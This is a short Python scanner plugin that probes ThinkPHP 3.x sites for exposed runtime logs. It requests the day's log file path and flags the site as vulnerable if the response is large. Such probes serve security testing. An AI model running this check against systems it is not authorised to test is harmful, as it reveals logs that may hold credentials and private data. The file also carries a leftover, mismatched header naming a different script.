"""  
@Time: 2024/2/28 15:34 
@Auth: Y5neKO
@File: Thinkphp3_log_leakage.py.py 
@IDE: PyCharm 
"""
from datetime import datetime

"""  
@Time: 2023/11/1 11:24 
@Auth: Y5neKO
@File: Thinkphp2_rce.py 
@IDE: PyCharm 
"""

import requests
import re
import urllib
from urllib.parse import urljoin


def run(url, timeout):
    result = {
        'name': 'Thinkphp 3.x log leakage',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    current_date = datetime.now()
    formatted_date = current_date.strftime('%y_%m_%d')
    try:
        payload = urllib.parse.urljoin(url, '/Application/Runtime/Logs/Home/{}.log'.format(formatted_date))
        response = requests.get(payload, timeout=3)
        if len(response.text) > 1000:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = payload
        return result
    except:
        return result
